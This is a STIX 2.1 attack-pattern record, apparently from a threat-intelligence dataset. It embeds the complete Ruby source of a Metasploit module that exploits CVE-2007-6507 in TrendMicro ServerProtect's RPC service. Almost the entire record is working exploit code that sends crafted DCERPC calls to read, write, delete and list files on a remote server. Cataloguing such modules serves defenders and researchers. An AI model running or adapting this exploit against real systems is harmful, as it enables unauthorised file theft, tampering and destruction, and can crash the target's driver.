{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--85987306-7147-435f-bb59-27f4729de925",
    "created": "2024-08-14T16:22:45.54918Z",
    "modified": "2024-08-14T16:22:45.549184Z",
    "name": "TrendMicro ServerProtect File Access",
    "description": " This modules exploits a remote file access flaw in the ServerProtect Windows Server RPC service. Please see the action list (or the help output) for more information.  'DefaultOptions' => { 'DCERPC::ReadTimeout' => 300 # Long-running RPC calls ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/serverprotect/file.rb",
            "external_id": "file.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-6507"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TrendMicro ServerProtect File Access',\n      'Description'    => %q{\n        This modules exploits a remote file access flaw in the ServerProtect Windows\n      Server RPC service. Please see the action list (or the help output) for more\n      information.\n      },\n      'DefaultOptions' =>\n        {\n          'DCERPC::ReadTimeout' => 300 # Long-running RPC calls\n        },\n      'Author'         => [ 'toto' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-6507' ],\n          [ 'OSVDB', '44318' ],\n          [ 'ZDI', '07-077'],\n        ],\n      'Actions'        =>\n        [\n          [ 'delete', 'Description' => 'Delete a file' ],\n          [ 'download', 'Description' => 'Download a file' ],\n          [ 'upload', 'Description' => 'Upload a file' ],\n          [ 'list', 'Description' => 'List files (not recommended - will crash the driver)' ]\n        ]\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(5168),\n        OptString.new('RPATH',\n          [\n            false,\n            \"The remote filesystem path\",\n            nil\n          ]),\n        OptString.new('LPATH',\n          [\n            false,\n            \"The local filesystem path\",\n            nil\n          ]),\n      ])\n  end\n\n  def check_option(name)\n    if(not datastore[name])\n      raise RuntimeError, \"The #{name} parameter is required by this option\"\n    end\n  end\n\n  def auxiliary_commands\n    {\n      \"delete\" => \"Delete a file\",\n      \"download\" => \"Download a file\",\n      \"upload\" => \"Upload a file\",\n      \"list\" => \"List files (not recommended - will crash the driver)\",\n    }\n  end\n\n  def run\n    case action.name\n    when 'download'\n      check_option('RPATH')\n      check_option('LPATH')\n      cmd_download(datastore['RPATH'], datastore['LPATH'])\n    when 'upload'\n      check_option('RPATH')\n      check_option('LPATH')\n      cmd_upload(datastore['RPATH'], datastore['LPATH'])\n    when 'delete'\n      check_option('RPATH')\n      cmd_delete(datastore['RPATH'])\n    when 'list'\n      check_option('RPATH')\n      cmd_list(datastore['RPATH'])\n    else\n      print_error(\"Unknown action #{action.name}\")\n    end\n  end\n\n  def deunicode(str)\n    str.gsub(/\\x00/, '').strip\n  end\n\n  #\n  # Once this function is used, if cmd_download or cmd_upload is called the server will crash :/\n  #\n  def cmd_list(*args)\n\n    if (args.length < 1)\n      print_status(\"Usage: list folder\")\n      return\n    end\n\n    file = Rex::Text.to_unicode(args[0])\n\n    data = \"\\0\" * 0x100\n    data[4, file.length] = file\n\n    # FindFirstFile\n    resp = serverprotect_rpccmd(131080, data, 0x100)\n    return if not resp\n\n    if resp.length != 0x108\n      print_error(\"An unknown error occurred while calling FindFirstFile.\")\n      return\n    end\n\n\n    ret, = resp[0x104,4].unpack('V')\n    if ret != 0\n      print_error(\"An error occurred while calling FindFirstFile #{args[0]}: #{ret}.\")\n      return\n    end\n\n    handle, = resp[4,4].unpack('V')\n\n    file = deunicode(resp[0x30, 0xd0])\n    print(\"#{file}\\n\")\n\n    data = \"\\0\" * 0x100\n    data[0,4] = [handle].pack('V')\n\n    while true\n      # FindNextFile\n      resp = serverprotect_rpccmd(131081, data, 0x100)\n      return if not resp\n\n      if resp.length != 0x108\n        print_error(\"An unknown error occurred while calling FindFirstFile.\")\n        break\n      end\n\n      ret, = resp[0x104,4].unpack('V')\n      if ret != 0\n        break\n      end\n\n      file = deunicode(resp[0x30, 0xd0])\n      print(\"#{file}\\n\")\n    end\n\n    data = \"\\0\" * 0x100\n    data = [handle].pack('V')\n    # FindClose\n    resp = serverprotect_rpccmd(131082, data, 0x100)\n  end\n\n\n  def cmd_delete(*args)\n\n    if (args.length == 0)\n      print_status(\"Usage: delete c:\\\\windows\\\\system.ini\")\n      return\n    end\n\n    data = Rex::Text.to_unicode(args[0]+\"\\0\")\n    resp = serverprotect_rpccmd(131077, data, 4)\n    return if not resp\n\n    if (resp.length == 12)\n      ret, = resp[8,4].unpack('V')\n\n      if ret == 0\n        print_good(\"File #{args[0]} successfully deleted.\")\n      else\n        print_error(\"An error occurred while deleting #{args[0]}: #{ret}.\")\n      end\n    end\n\n  end\n\n\n  def cmd_download(*args)\n\n    if (args.length < 2)\n      print_status(\"Usage: download remote_file local_file\")\n      return\n    end\n\n    # GENERIC_READ: 0x80000000\n    # FILE_SHARE_READ: 1\n    # OPEN_EXISTING: 3\n    # FILE_ATTRIBUTE_NORMAL: 0x80\n    handle = serverprotect_createfile(args[0], 0x80000000, 1, 3, 0x80)\n    if (not handle or handle == 0)\n      return\n    end\n\n    fd = File.new(args[1], \"wb\")\n\n    print_status(\"Downloading #{args[0]}...\")\n\n    # reads 0x1000 bytes (hardcoded in the soft)\n    while ((data = serverprotect_readfile(handle)).length > 0)\n      fd.write(data)\n    end\n\n    fd.close\n\n    serverprotect_closehandle(handle)\n\n    print_good(\"File #{args[0]} successfully downloaded.\")\n  end\n\n\n  def cmd_upload(*args)\n\n    if (args.length < 2)\n      print_status(\"Usage: upload local_file remote_file\")\n      return\n    end\n\n    # GENERIC_WRITE: 0x40000000\n    # FILE_SHARE_WRITE: 2\n    # CREATE_ALWAYS: 2\n    # FILE_ATTRIBUTE_NORMAL: 0x80\n    handle = serverprotect_createfile(args[1], 0x40000000, 2, 2, 0x80)\n    if (handle == 0)\n      return\n    end\n\n    fd = File.new(args[0], \"rb\")\n\n    print_status(\"Uploading #{args[1]}...\")\n\n    # write 0x1000 bytes (hardcoded in the soft)\n    while ((data = fd.read(0x1000)) != nil)\n      serverprotect_writefile(handle, data)\n    end\n\n    fd.close\n\n    serverprotect_closehandle(handle)\n\n    print_good(\"File #{args[1]} successfully uploaded.\")\n  end\n\n\n  def serverprotect_createfile(file, desiredaccess, sharemode, creationdisposition, flags)\n    data = \"\\0\" * 540\n    file = Rex::Text.to_unicode(file)\n    data[4, file.length] = file\n    data[524, 16] = [desiredaccess, sharemode, creationdisposition, flags].pack('VVVV')\n\n    resp = serverprotect_rpccmd(131073, data, 540)\n    return if not resp\n\n    if (resp.length < 548)\n      print_error(\"An unknown error occurred while calling CreateFile.\")\n      return 0\n    else\n      handle, = resp[4,4].unpack('V')\n      ret, = resp[544,4].unpack('V')\n\n      if ret != 0\n        print_error(\"An error occurred while calling CreateFile: #{ret}.\")\n        return 0\n      else\n        return handle\n      end\n    end\n  end\n\n\n  def serverprotect_readfile(handle)\n    data = \"\\0\" * 4104\n    data[0, 4] = [handle].pack('V')\n\n    resp = serverprotect_rpccmd(131075, data, 4104)\n    return if not resp\n\n    if (resp.length != 4112)\n      print_error(\"An unknown error occurred while calling ReadFile.\")\n      return ''\n    else\n      ret, = resp[4108,4].unpack('V')\n\n      if ret != 0\n        print_error(\"An error occurred while calling CreateFile: #{ret}.\")\n        return ''\n      else\n        br, = resp[4104, 4].unpack('V')\n        return resp[8, br]\n      end\n    end\n  end\n\n\n  def serverprotect_writefile(handle, buf)\n    data = \"\\0\" * 4104\n    data[0, 4] = [handle].pack('V')\n    data[4, buf.length] = buf\n    data[4100, 4] = [buf.length].pack('V')\n\n    resp = serverprotect_rpccmd(131076, data, 4104)\n    return if not resp\n\n    if (resp.length != 4112)\n      print_error(\"An unknown error occurred while calling WriteFile.\")\n      return 0\n    else\n      ret, = resp[4108,4].unpack('V')\n\n      if ret != 0\n        print_error(\"An error occurred while calling WriteFile: #{ret}.\")\n        return 0\n      end\n    end\n\n    return 1\n  end\n\n\n  def serverprotect_closehandle(handle)\n    data = [handle].pack('V')\n\n    resp = serverprotect_rpccmd(131074, data, 4)\n    return if not resp\n\n    if (resp.length != 12)\n      print_error(\"An unknown error occurred while calling CloseHandle.\")\n    else\n      ret, = resp[8,4].unpack('V')\n\n      if ret != 0\n        print_error(\"An error occurred while calling CloseHandle: #{ret}.\")\n      end\n    end\n  end\n\n\n  def serverprotect_rpccmd(cmd, data, osize)\n    if (data.length.remainder(4) != 0)\n      padding = \"\\0\" * (4 - (data.length.remainder(4)))\n    else\n      padding = \"\"\n    end\n\n    stub =\n      NDR.long(cmd) +\n      NDR.long(data.length) +\n      data +\n      padding +\n      NDR.long(data.length) +\n      NDR.long(osize)\n\n    return serverprotect_rpc_call(0, stub)\n  end\n\n  #\n  # Call the serverprotect RPC service\n  #\n  def serverprotect_rpc_call(opnum, data = '')\n\n    begin\n\n      connect\n\n      handle = dcerpc_handle(\n        '25288888-bd5b-11d1-9d53-0080c83a5c2c', '1.0',\n        'ncacn_ip_tcp', [datastore['RPORT']]\n      )\n\n      dcerpc_bind(handle)\n\n      resp = dcerpc.call(opnum, data)\n      outp = ''\n\n      if (dcerpc.last_response and dcerpc.last_response.stub_data)\n        outp = dcerpc.last_response.stub_data\n      end\n\n      disconnect\n\n      outp\n\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n      nil\n    end\n  end\nend\n"
}